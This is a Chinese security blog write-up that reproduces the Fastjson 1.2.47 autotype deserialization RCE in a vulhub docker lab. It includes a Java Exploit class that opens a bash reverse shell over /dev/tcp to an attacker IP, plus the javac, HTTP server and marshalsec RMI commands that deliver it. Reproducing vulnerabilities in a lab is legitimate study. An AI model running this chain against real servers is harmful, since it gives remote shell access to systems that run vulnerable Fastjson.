# Fastjson-RCE漏洞复现

阅读量 **508163**

发布时间 : 2021-06-09 18:00:49

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01f0e03aef160d4270.png)

Fastjson提供autotype功能，允许用户在反序列化数据中通过 [@type](https://github.com/type "@type")
指定反序列化的类型，其次Fastjson自定义的反序列化会调用指定类中的setter方法和部分getter方法。  
当组件开启autotype并且反序列化不可信的数据时，攻击者构造的数据（恶意代码）会进入特定类的setter或getter方法中，可能会被恶意利用。  
影响版本  
Fastjson1.2.47以及之前的版本

## 复现

###  1.1 环境准备

**攻击机1**

用于接受反弹shell  
系统：Win10 x64  
安装nc，burpsuite  
win10中需安装nc，用于监听反弹的shell。  
在win10下，在nc官网([https://eternallybored.org/misc/netcat/)下载会报毒被拦截。](https://eternallybored.org/misc/netcat/\)%E4%B8%8B%E8%BD%BD%E4%BC%9A%E6%8A%A5%E6%AF%92%E8%A2%AB%E6%8B%A6%E6%88%AA%E3%80%82)  
可以使用nmap中重置的ncat([https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)，与nc使用无区别。](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe\)%EF%BC%8C%E4%B8%8Enc%E4%BD%BF%E7%94%A8%E6%97%A0%E5%8C%BA%E5%88%AB%E3%80%82)  
下载后进入，ncat所在目录，执行 **ncat** ，出现如下输出则安装成功

![](https://p2.ssl.qhimg.com/t016c45bc0e0a10d5dc.png)

**攻击机2**

提供一些必要服务  
系统：Ubuntu  
需安装：marshlsec ( <https://github.com/mbechler/marshalsec>
)（用于启动RMI服务）、python环境（用于启动SimpleHTTPServer服务）、openjdk  
marshlsec下载后，需要使用mvn打包，无mvn命令需要安装Maven  
marshlsec下载后，进入文件目录执行 **sudo mvn clean package -DskipTests**
，完成后会在目录的target目录中发现两个jar包

![](https://p3.ssl.qhimg.com/t01c87f7e591d9112ea.png)

**受害机**

系统：Ubuntu （与上述提供RMI和Web服务的机器可以是一台或不同）  
需安装：docker、docker-composer、vulhub

###  1.2 示意图

![](https://p1.ssl.qhimg.com/t01be16ec1bb323c45f.png)

###  1.3 复现流程

在 攻击机1 开启监听

![](https://p2.ssl.qhimg.com/t011f2b362d73fb5f26.png)

在受害机上启动环境，进入vulhub中的/fastjson/1.2.47-rce/，使用如下命令启动服务：

`# docker-compose up -d`  
在 攻击机1 上访问该服务，如下则为成功

![](https://p5.ssl.qhimg.com/t018416d1990a524a75.png)

构造恶意代码文件vim Exploit.java，内容如下  
代码中192.168.253.129/6666修改为攻击机1的ip和监听反弹shell的端口

    
    
    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    
    public class Exploit{
        public Exploit() throws Exception {
            //Process p = Runtime.getRuntime().exec(new String[]{"cmd","/c","calc.exe"});
          Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/192.168.253.129/6666;cat <&5 | while read line; do $line 2>&5 >&5; done"});
            InputStream is = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
    
            String line;
            while((line = reader.readLine()) != null) {
                System.out.println(line);
            }
    
            p.waitFor();
            is.close();
            reader.close();
            p.destroy();
        }
    
        public static void main(String[] args) throws Exception {
        }
    }
    

编写完成后，对该文件进行编译生成对应的class文件

`# javac Exploit.java`

![](https://p0.ssl.qhimg.com/t010450cb51ba0d45c0.png)

在 攻击机2 上启动RMI和Web服务  
· 启动Web服务  
`# python -m SimpleHTTPServer 8080`

![](https://p0.ssl.qhimg.com/t011ce335836a22a426.png)

使用 攻击机1 访问 攻击机2开放的Web服务，如下则成功

![](https://p3.ssl.qhimg.com/t0118b598655d6f49f0.png)

启动RMI服务  
进入marshalsec打包好的jar包目录执行命令，如下  
192.168.253.138:8080 为上述Web服务地址和端口，需自行修改  
8888 可为任意端口  
`# java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  
marshalsec.jndi.RMIRefServer  
"http://192.168.253.138:8080/#Exploit" 8888`

![](https://p5.ssl.qhimg.com/t01345bec10e2ead76d.png)

在 攻击机1 上构造恶意请求

![](https://p1.ssl.qhimg.com/t017a321a87f848049d.png)

发送请求后，等待ncat获取反弹shell，可见在恶意代码中构造的命令执行，成功反弹shell，可以执行命令

![](https://p4.ssl.qhimg.com/t0136483b6f9424a320.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **锦行科技** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/242330](/post/id/242330)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [fastjson](/tag/fastjson)

 **+1** __0赞

 __收藏

![](https://p3.ssl.qhimg.com/t0178bf4a1b5818189f.png) 锦行科技

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

